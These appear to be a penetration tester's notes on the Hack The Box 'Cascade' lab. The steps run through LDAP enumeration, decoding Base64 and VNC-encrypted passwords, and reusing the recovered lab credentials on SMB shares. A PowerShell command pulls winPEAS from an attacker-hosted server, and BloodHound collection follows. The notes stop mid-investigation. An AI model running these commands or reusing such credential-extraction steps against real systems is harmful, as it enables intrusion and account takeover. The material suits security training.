Dump users into a file, grep and clean, then use script to asrep roast.
ASREP roast came back with nothing.
weak password policy, want to try and crack... Too much. Enumerate thoroughly, exploit simply. I'm missing something
LDAP dump with `ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182`
Reallllllly look. Ryan encoded password. Looks like BASE64 ![Image](/assets/Screenshot 2024-09-16 at 2.20.37 PM.png)
Decode with online decoder, password is `rY4n5eva`
Time to re-enumerate shares with `smbmap -H cascade.htb -u "user" -p "pass"`

Only share we have access to is IT. Interesting email, log files, but really interesting s.smith files

Hex password and possible VNC service escalation![Image](/assets/Screenshot 2024-09-16 at 2.49.23 PM.png)
Regular hex decoding didn't work, but there is a VNC decrypt tool for it. Which other box used this?
Encode and create the crackable file, as the tool only takes ciphertext: `echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc.psd`
`sT333ve2` Password ![Image](/assets/Screenshot 2024-09-16 at 3.08.13 PM.png)
We've got two sets of credentials now.  `s.smith:sT333ve2` and `r.thompson:rY4n5eva`
Re-Enumerate
Steve's credentials grant us access to Audit$ share (smbmap script like above)![Image](/assets/Screenshot 2024-09-16 at 3.12.16 PM.png)
Gain access by `smbclient //10.10.10.182/Audit$ --user s.smith%sT333ve2`

Big Oof trying to transfer with SMB and CertUtil. Crashed box twice. Python worked though. Serve WinPEAS
`powershell "Invoke-WebRequest -UseBasicParsing 10.10.14.3:80/winPEASany.exe -OutFile winPEAS.exe`

Serve bloodhound ingester remotely as well. `bloodhound-python -d cascade.local -u s.smith -p sT333ve2 -ns 10.10.10.182 -c all`

Nothing from bloodhound as far as I can tell. WinPEAS?
